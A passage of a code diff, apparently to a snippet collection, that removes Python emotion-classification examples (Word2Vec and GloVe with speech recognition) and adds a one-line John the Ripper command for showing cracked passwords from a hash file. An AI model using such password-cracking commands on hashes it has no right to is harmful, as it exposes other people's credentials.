-    workers=2,
-    epochs=100
-)
-
-def sentence_vector(sentence, model):
-    words = sentence.lower().split()
-    vectors = [model.wv[w] for w in words if w in model.wv]
-    return np.mean(vectors, axis=0) if vectors else np.zeros(model.vector_size)
-
-X = np.array([sentence_vector(s, w2v_model) for s in sentences])
-
-labels = [
-    "happy","happy","happy",
-    "sad","sad","sad",
-    "angry","angry","angry",
-    "fear","fear","fear"
-]
-
-clf = LogisticRegression(max_iter=1000)
-clf.fit(X, labels)
-
-print("Emotion classifier trained")
-
-if transcribed_text.strip() != "":
-    test_vector = sentence_vector(transcribed_text, w2v_model)
-    prediction = clf.predict([test_vector])[0]
-    print("Predicted Emotion:", prediction)
-else:
-    print("No speech detected")`,
-      },
-      {
-        title: "GloVe Module Emotion",
-        code: `!pip install gTTS SpeechRecognition pydub gensim
-!apt-get install -y ffmpeg
-
-from gtts import gTTS
-from pydub import AudioSegment
-import speech_recognition as sr
-import re
-import gensim.downloader as api
-import numpy as np
-from numpy.linalg import norm
-
-text = "I am feeling very sad and lonely today"
-tts = gTTS(text=text, lang='en')
-tts.save("sample.mp3")
-
-audio = AudioSegment.from_mp3("sample.mp3")
-audio = audio.set_frame_rate(16000).set_channels(1).set_sample_width(2)
-audio.export("sample.wav", format="wav")
-
-recognizer = sr.Recognizer()
-
-try:
-    with sr.AudioFile("sample.wav") as source:
-        audio_data = recognizer.record(source)
-    recognized_text = recognizer.recognize_google(audio_data)
-except:
-    recognized_text = ""
-
-print("Recognized Text:", recognized_text)
-
-def preprocess(text):
-    text = text.lower()
-    text = re.sub(r'[^a-z\\s]', '', text)
-    return text.split()
-
-tokens = preprocess(recognized_text)
-print("Tokens:", tokens)
-
-glove = api.load("glove-wiki-gigaword-100")
-
-def sentence_vector(tokens, model):
-    vectors = [model[word] for word in tokens if word in model]
-    if len(vectors) == 0:
-        return np.zeros(model.vector_size)
-    return np.mean(vectors, axis=0)
-
-sentence_vec = sentence_vector(tokens, glove)
-
-emotion_sentences = {
-    "happy": ["i am very happy", "this is a wonderful day"],
-    "sad": ["i feel sad", "i am lonely and depressed"],
-    "angry": ["i am angry", "this makes me furious"],
-    "neutral": ["it is a normal day", "nothing special today"]
-}
-
-emotion_vectors = {}
-
-for emotion, sentences in emotion_sentences.items():
-    vecs = []
-    for s in sentences:
-        vecs.append(sentence_vector(preprocess(s), glove))
-    emotion_vectors[emotion] = np.mean(vecs, axis=0)
-
-def cosine_similarity(a, b):
-    if norm(a) == 0 or norm(b) == 0:
-        return 0
-    return np.dot(a, b) / (norm(a) * norm(b))
-
-scores = {}
-
-for emotion, vec in emotion_vectors.items():
-    scores[emotion] = cosine_similarity(sentence_vec, vec)
-
-predicted_emotion = max(scores, key=scores.get)
-
-print("Emotion Scores:")
-for k, v in scores.items():
-    print(k, ":", round(v, 3))
-
-print("\\nPredicted Emotion:", predicted_emotion.upper())`,
-      },
-    ],
+# View cracked passwords
+john --show myhashes.txt`,
   },
 ];
